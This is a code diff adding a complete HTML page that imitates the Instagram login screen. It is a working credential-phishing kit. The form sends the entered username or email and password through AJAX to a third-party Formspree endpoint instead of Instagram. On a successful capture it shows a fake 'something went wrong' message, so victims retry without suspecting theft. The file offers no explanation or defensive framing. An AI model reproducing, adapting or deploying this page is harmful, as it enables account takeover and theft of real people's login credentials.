@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instagram_login</title>
+</head>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Courgette&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Andika+New+Basic&family=Courgette&display=swap');
+    * {
+        margin: 0;
+        padding: 0px;
+        box-sizing: border-box;
+    }
+    
+    body {
+        font-family: 'Andika New Basic', sans-serif;
+    }
+    
+    h1 {
+        font-family: 'Courgette', cursive;
+    }
+    
+    .body-page {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    
+    .container {
+        position: relative;
+        top: 0px;
+        width: 75vw;
+        height: 50vh;
+        background-color: white;
+    }
+    
+    .head h1 {
+        color: rgba(0, 0, 0, 0.986);
+        text-align: center;
+        margin-bottom: 30px;
+    }
+    
+    form {
+        margin-top: 20px;
+    }
+    
+    form .form-group input {
+        width: 75vw;
+        height: 8vw;
+        padding: 9px;
+        background-color: rgba(180, 180, 180, 0.096);
+        margin-top: 10px;
+        border: 1px solid rgba(128, 128, 128, 0.411);
+        border-radius: 6px;
+        outline: none;
+    }
+    
+    form .form-group input:hover {
+        outline: 1px solid rgba(29, 29, 29, 0.267);
+        border: none;
+    }
+    
+    .left {
+        margin-top: 20px;
+        margin-left: 130px;
+    }
+    
+    .left a {
+        text-decoration: none;
+        color: rgba(0, 0, 184, 0.787);
+    }
+    
+    .btn {
+        margin-top: 20px;
+        width: 75vw;
+        padding: 5px;
+        font-size: 15px;
+        background-color: rgba(11, 76, 255, 0.74);
+        color: white;
+        border: none;
+        border-radius: 4px;
+    }
+    
+    .btn:hover {
+        background-color: rgb(0, 0, 223);
+        transition: all ease-in-out 0.3s;
+    }
+    
+    .sign-para {
+        color: rgba(51, 51, 51, 0.63);
+        text-align: center;
+        margin-top: 15px;
+    }
+    
+    .sign-para a {
+        text-decoration: none;
+        font-weight: bold;
+        color: rgba(41, 41, 250, 0.589);
+    }
+    
+    footer {
+        height: 20vh;
+        background: blue;
+    }
+    
+    .p-head {
+        position: sticky;
+        height: 10vh;
+        text-align: center;
+        background-color: rgba(128, 128, 128, 0.062);
+    }
+    
+    .p-head p {
+        color: rgba(27, 27, 27, 0.472);
+    }
+    
+    #status {
+        color: red;
+        text-align: center;
+    }
+</style>
+
+<body>
+
+    <div class="body-page">
+        <div class="container">
+            <div class="head">
+                <h1>Instagram</h1>
+            </div>
+            <hr>
+            <form action="https://formspree.io/f/meqprkjv" method="POST" id="my-form">
+                <div class="form-group">
+                    <input type="text" name="email" required placeholder="Phone number,username, or email">
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" required placeholder="Password">
+                </div>
+                <p class="left"><a href="#">Forgot password?</a></p>
+                <button id="my-form-button" class="btn">Log In</button>
+            </form>
+            <p class="sign-para">
+                Dont't have an accound?<a href="#">Sign up</a>
+            </p>
+            <p id="status">
+
+            </p>
+        </div>
+    </div>
+    <hr>
+    <div class="p-head">
+        <p>form</p>
+        <h4>FACEBOOK</h4>
+    </div>
+
+</body>
+<script>
+    window.addEventListener("DOMContentLoaded", function() {
+
+        // get the form elements defined in your form HTML above
+
+        var form = document.getElementById("my-form");
+        var button = document.getElementById("my-form-button");
+        var status = document.getElementById("status");
+
+        // Success and Error functions for after the form is submitted
+
+        function success() {
+            form.reset();
+
+            status.innerHTML = "something went wrong";
+        }
+
+        function error() {
+            status.innerHTML = "sorry error accured..";
+        }
+
+        // handle the form submission event
+
+        form.addEventListener("submit", function(ev) {
+            ev.preventDefault();
+            var data = new FormData(form);
+            ajax(form.method, form.action, data, success, error);
+        });
+    });
+
+    // helper function for sending an AJAX request
+
+    function ajax(method, url, data, success, error) {
+        var xhr = new XMLHttpRequest();
+        xhr.open(method, url);
+        xhr.setRequestHeader("Accept", "application/json");
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState !== XMLHttpRequest.DONE) return;
+            if (xhr.status === 200) {
+                success(xhr.response, xhr.responseType);
+            } else {
+                error(xhr.status, xhr.response, xhr.responseType);
+            }
+        };
+        xhr.send(data);
+    }
+</script>
+
+</html>
